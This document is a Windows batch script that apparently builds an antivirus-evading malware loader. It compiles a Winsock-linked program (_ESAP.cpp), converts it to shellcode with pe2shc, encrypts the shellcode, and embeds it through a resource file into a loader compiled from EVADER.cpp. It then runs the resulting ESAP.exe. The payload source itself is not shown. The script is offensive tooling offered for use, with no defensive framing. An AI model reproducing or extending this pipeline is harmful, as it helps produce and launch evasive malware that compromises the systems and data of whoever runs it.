@echo off

echo compiling: _ESAP.cpp
g++ _ESAP.cpp -lwsock32 -lWs2_32 -o _ESAP
if %errorlevel% neq 0 (
    echo compilation failed.
    exit
)

echo pe to shellcode
pe2shc _ESAP.exe _ESAP.shc

echo compiling and running: ENCRYPT.cpp
g++ ENCRYPT.cpp -o ENCRYPT
ENCRYPT.exe _ESAP.shc

echo compiling: esap_rss.rc
windres esap_rss.rc -o esap_rss.o

echo compiling: EVADER.cpp
g++ EVADER.cpp esap_rss.o -O3 -Os -o ESAP

if %errorlevel% equ 0 (
    echo compilation successful. running ESAP.exe.
    ESAP.exe
) else (
    echo compilation failed.
)